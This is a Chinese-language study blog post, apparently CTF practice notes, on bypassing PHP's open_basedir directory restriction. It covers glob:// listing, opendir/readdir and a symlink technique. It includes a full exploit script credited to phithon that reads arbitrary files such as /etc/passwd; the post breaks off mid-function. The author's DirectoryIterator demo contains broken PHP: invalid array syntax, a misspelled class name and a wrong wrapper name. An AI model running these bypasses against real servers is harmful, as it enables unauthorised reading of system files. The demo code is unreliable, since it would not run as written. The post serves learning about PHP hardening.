  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>
</div>
</div>
<div class="min-w-0 min-h-0 max-w-fit">
<div class="article-content max-w-prose mb-20">
<h1 class="relative group">前言 
    <div class="anchor" id="前言"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%89%8d%e8%a8%80">#</a>
</span>
</h1>
<p>emm最近刷题呢，之前都没有系统刷过题目所以有些知识点就没有学习，现在就来一点点补上，还是太菜了</p>
<h1 class="relative group">introduction 
    <div class="anchor" id="introduction"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#introduction">#</a>
</span>
</h1>
<p><strong>Open_basedir</strong>是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。</p>
<p>设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/opendir/1.png"/>
</figure>

可以在<strong>php.ini</strong>配置文件中进行配置</p>
<h1 class="relative group">globe://伪协议 
    <div class="anchor" id="globe伪协议"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#globe%e4%bc%aa%e5%8d%8f%e8%ae%ae">#</a>
</span>
</h1>
<p>那么在使用这个协议之前那肯定得知道这个协议是什么吧，所以也是去看了一下php的doc <a href="https://www.php.net/manual/zh/wrappers.glob.php" target="_blank">https://www.php.net/manual/zh/wrappers.glob.php</a></p>
<h3 class="relative group">Simple Globe:// 
    <div class="anchor" id="simple-globe"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#simple-globe">#</a>
</span>
</h3>
<p>可以看见官方给出的demo</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
</span></span><span class="line"><span class="cl"><span class="c1">// 循环 ext/spl/examples/ 目录里所有 *.php 文件  
</span></span></span><span class="line"><span class="cl"><span class="c1">// 并打印文件名和文件尺寸  
</span></span></span><span class="line"><span class="cl"><span class="nv">$it</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">"glob://ext/spl/examples/*.php"</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$it</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">"%s: %.1FK</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">getFilename</span><span class="p">(),</span> <span class="nv">$f</span><span class="o">-&gt;</span><span class="na">getSize</span><span class="p">()</span><span class="o">/</span><span class="mi">1024</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>  
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这个只做一个引入，因为单纯的使用globe伪协议是没有办法绕过的，并且不能列出前面的目录以及以外的文件，更不能读取文件内容所以单纯的使用并没有什么好玩的</p>
<h3 class="relative group">Diretorylterator + Globe:// 
    <div class="anchor" id="diretorylterator--globe"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#diretorylterator--globe">#</a>
</span>
</h3>
<p>关于Diretorylterator这个类的一些介绍： <a href="https://www.php.net/manual/zh/class.directoryiterator.php" target="_blank">https://www.php.net/manual/zh/class.directoryiterator.php</a>
php5中增加的一个类，为用户提供一个简单的查看目录的接口
demo2:</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">{};</span>
</span></span><span class="line"><span class="cl"><span class="nv">$mulu</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Diretorylterator</span><span class="p">(</span><span class="s2">"globle:///*"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$mulu</span> <span class="k">as</span> <span class="nv">$a</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">__toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">sort</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">"</span><span class="si">{</span><span class="nv">$s</span><span class="si">}</span><span class="s2">&lt;br/&gt;"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这里自己打了一遍，因为不想贴别人的代码…（主要是自己打一遍比较好）,绕过条件：PHP&gt;5.3 &amp;&amp; Linux环境下才可</p>
<h3 class="relative group">opendir()+readdir()+glob:// 
    <div class="anchor" id="opendirreaddirglob"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#opendirreaddirglob">#</a>
</span>
</h3>
<ul>
<li>opendir()–&gt;打开目录</li>
<li>readdir()-&gt;返回目录中下一个文件的文件名。文件名以在文件系统中的排序返回。</li>
</ul>
<p>所以脚本如下</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nv">$b</span> <span class="o">=</span> <span class="nx">opendir</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">readdir</span><span class="p">(</span><span class="nv">$b</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$file</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">closedir</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div>
<h3 class="relative group">scandir()+glob:// 
    <div class="anchor" id="scandirglob"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#scandirglob">#</a>
</span>
</h3>
<p>关于这个解法我不打算去看因为这个也是好像绕不了open_basedir的
引用：“这种方法也只能列出根目录和open_basedir允许目录下的文件。“</p>
<h1 class="relative group">symlink绕过 
    <div class="anchor" id="symlink绕过"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#symlink%e7%bb%95%e8%bf%87">#</a>
</span>
</h1>
<p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。： <a href="https://www.php.net/manual/zh/function.symlink.php" target="_blank">https://www.php.net/manual/zh/function.symlink.php</a>
用法：
symlink(string $target, string $link): bool</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">"A"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">"A"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">"B"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">"B"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">"C"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">"C"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">"D"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">"D"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s2">".."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="s2">"A/B/C/D"</span><span class="p">,</span><span class="s2">"SD"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="s2">"SD/../../../../etc/passwd"</span><span class="p">,</span><span class="s2">"POC"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="s2">"SD"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s2">"SD"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这里的原理就是通过软连接作为一个桥梁来进行绕过
具体的思路如下：</p>
<ul>
<li>创建了A/B/C/D这个目录</li>
<li>创建SD软链接到目录A/B/C/D</li>
<li>然后让POC指向SD上面的目录这个时候因为返回后../../../../刚好回到open_basedir限制的html目录下面所以这里没毛病</li>
<li>然后删除了SD软链接又创建了一个文件夹这个时候POC指向的就是:
<strong>var/www/html/SD/../../../../etc/passwd</strong>从而进行绕过（这个思路确实好玩）
exp哈哈哈哈哈哈哈哈哈也是贴贴</li>
</ul>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">'content-type: text/plain'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">"open_basedir: %s</span><span class="se">\n</span><span class="s2">php_version: %s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">),</span> <span class="nx">phpversion</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nx">printf</span><span class="p">(</span><span class="s2">"disable_functions: %s</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s1">'disable_functions'</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">'/etc/passwd'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$relat_file</span> <span class="o">=</span> <span class="nx">getRelativePath</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$paths</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$name</span> <span class="o">=</span> <span class="nx">mt_rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">999</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">getRandStr</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$paths</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$paths</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$relat_file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$paths</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'..'</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$j</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nv">$j</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="s1">'..'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">array_fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">),</span> <span class="s1">'tmplink'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">array_fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">symlink</span><span class="p">(</span><span class="s1">'tmplink/'</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$exp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="s1">'tmplink'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mkdir</span><span class="p">(</span><span class="s1">'tmplink'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">delfile</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_NAME'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"/</span><span class="si">{</span><span class="nv">$exp</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$exp</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SERVER_NAME'</span><span class="p">]</span><span class="si">}{</span><span class="nv">$exp</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">-----------------content---------------</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$exp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">delfile</span><span class="p">(</span><span class="s1">'tmplink'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getRelativePath</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// some compatibility fixes for Windows paths
</span></span></span><span class="line"><span class="cl">  <span class="nv">$from</span> <span class="o">=</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="s1">'\/'</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'/'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$from</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$to</span>   <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">$from</span>   <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$to</span>     <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$relPath</span>  <span class="o">=</span> <span class="nv">$to</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">foreach</span><span class="p">(</span><span class="nv">$from</span> <span class="k">as</span> <span class="nv">$depth</span> <span class="o">=&gt;</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// find first non-matching dir
</span></span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">===</span> <span class="nv">$to</span><span class="p">[</span><span class="nv">$depth</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// ignore this directory
</span></span></span><span class="line"><span class="cl">      <span class="nx">array_shift</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// get number of remaining dirs to $from
</span></span></span><span class="line"><span class="cl">      <span class="nv">$remaining</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$from</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$depth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nv">$remaining</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// add traversals up to first matching dir
</span></span></span><span class="line"><span class="cl">        <span class="nv">$padLength</span> <span class="o">=</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">)</span> <span class="o">+</span> <span class="nv">$remaining</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$relPath</span> <span class="o">=</span> <span class="nx">array_pad</span><span class="p">(</span><span class="nv">$relPath</span><span class="p">,</span> <span class="nv">$padLength</span><span class="p">,</span> <span class="s1">'..'</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'./'</span> <span class="o">.</span> <span class="nv">$relPath</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$relPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">delfile</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">chmod</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nv">$mydir</span> <span class="o">=</span> <span class="o">@</span><span class="nx">opendir</span><span class="p">(</span><span class="nv">$deldir</span><span class="p">))</span> <span class="o">==</span> <span class="k">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="o">@</span><span class="nx">readdir</span><span class="p">(</span><span class="nv">$mydir</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="nx">File_Str</span><span class="p">(</span><span class="nv">$deldir</span><span class="o">.</span><span class="s1">'/'</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
